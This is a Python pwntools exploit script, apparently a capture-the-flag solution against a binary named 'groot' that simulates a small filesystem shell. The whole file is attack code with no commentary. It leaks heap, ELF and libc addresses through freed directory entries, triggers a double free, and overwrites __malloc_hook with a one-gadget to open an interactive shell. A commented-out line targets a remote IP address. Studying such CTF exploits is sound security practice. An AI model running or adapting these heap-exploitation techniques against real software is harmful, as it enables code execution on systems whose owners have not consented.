from pwn import *

OFFSET_FILENAME3 = 0x12fc0
OFFSET_FILENAME4 = 0x13040
OFFSET_FILECONTENT5 = 0x130c8
ELF_OFFSET = 0x204040
ELF_POSITION = 0x11eb8
SCHK_OFFSET_GOT = 0x203f70
SCHK_OFFSET = 0x134c80
MALLOC_HOOK_OFFSET = 0x3ebc30
MAGIC = 0x10a38c
env_vars = {'LD_LIBRARY_PATH':'.'}
context.log_level = 'debug'

def createFile(conn, file_name, content):
    conn.recvuntil('$')
    conn.sendline('mkfile ' + file_name)
    conn.recvuntil('Content?')
    conn.send(content)

def makeDir(conn, dir_name):
    conn.recvuntil('$')
    conn.sendline('mkdir ' + dir_name)

def cdDir(conn, dir_path):
    conn.recvuntil('$')
    conn.sendline('cd ' + dir_path)

def rm(conn, file_name):
    conn.recvuntil('$')
    conn.sendline('rm ' + file_name)

def mvFile(conn, old, new):
    conn.recvuntil('$')
    conn.sendline('mv ' + old + ' ' + new)

def ls(conn, path=''):
    conn.recvuntil('$')
    conn.sendline('ls ' + path)
    return conn.recvuntil('\n\n')

def touch(conn, file_name):
    conn.recvuntil('$')
    conn.sendline('touch ' + file_name)

conn = process('./groot', env=env_vars, aslr=False)
#conn = remote('54.238.202.201', 31733)
gdb.attach(conn)
makeDir     (conn, 'directory1')
cdDir       (conn, 'directory1')
createFile  (conn, 'file1', 'AAAA')
createFile  (conn, 'file2', 'BBBB')
createFile  (conn, 'file3', 'CCCC')
cdDir       (conn, '..')
rm          (conn, 'directory1')
makeDir     (conn, 'directory1')
leak = ls   (conn, 'directory1')
leak = leak.split('\x1b\x5b\x30\x6d\x09')[2]
leak = leak.ljust(8, '\x00')
heap_base = u64(leak) - 0x12d20
print 'Heap base: ' + hex(heap_base)
cdDir       (conn, 'A' * 0x30)
cdDir       (conn, 'A' * 0x30)
cdDir       (conn, 'A' * 0x30)
cdDir       (conn, 'AAAA')
cdDir       (conn, 'AAAA')
cdDir       (conn, 'AAAA')
cdDir       (conn, 'AAAA')
cdDir       (conn, 'AAAA')
cdDir       (conn, '..')
makeDir     (conn, 'groot2')
cdDir       (conn, 'groot2')


### Workspace should be clear now
createFile  (conn, 'file1', 'file1')
createFile  (conn, 'file2', 'file2')
createFile  (conn, p64(heap_base + OFFSET_FILENAME4), 'file3')
createFile  (conn, p64(heap_base + OFFSET_FILECONTENT5), 'file4') 
createFile  (conn, 'file5', p64(heap_base + OFFSET_FILECONTENT5))
makeDir     (conn, 'directory1')
cdDir       (conn, 'directory1')
createFile  (conn, 'file1', 'file1')
cdDir       (conn, '..')
rm          (conn, 'file1')
rm          (conn, 'directory1')
rm          (conn, 'file2')
cdDir       (conn, 'A' * 0x30)
makeDir     (conn, 'directory1')
rm          (conn, 'directory1')

# Double free performed
cdDir       (conn, p64(heap_base + OFFSET_FILENAME3))
cdDir       (conn, p64(heap_base + OFFSET_FILENAME3))
cdDir       (conn, p64(heap_base + OFFSET_FILENAME3))
cdDir       (conn, p64(heap_base + OFFSET_FILENAME3))
cdDir       (conn, p64(heap_base + ELF_POSITION))
leak = ls   (conn, '')
leak = leak.split('\x1b\x5b\x30\x6d\x09')[3]
leak = leak.ljust(8, '\x00')
elf_base = u64(leak) - ELF_OFFSET
print 'ELF base: ' + hex(elf_base)
cdDir       (conn, p64(elf_base + SCHK_OFFSET_GOT))
cdDir       (conn, p64(elf_base + SCHK_OFFSET_GOT))
leak = ls   (conn, '')
leak = leak.split('\x1b\x5b\x30\x6d\x09')[2]
leak = leak.ljust(8, '\x00')
libc_base = u64(leak) - SCHK_OFFSET
print 'libc base: ' + hex(libc_base)
cdDir       (conn, p64(libc_base + MALLOC_HOOK_OFFSET))
cdDir       (conn, p64(libc_base + MALLOC_HOOK_OFFSET))
cdDir       (conn, p64(libc_base + MAGIC))
cdDir       (conn, p64(libc_base + MAGIC))
cdDir       (conn, p64(libc_base + MAGIC))
createFile  (conn, "I_AM_GROOT!!!", "I_AM_GROOT!!!")
conn.interactive()
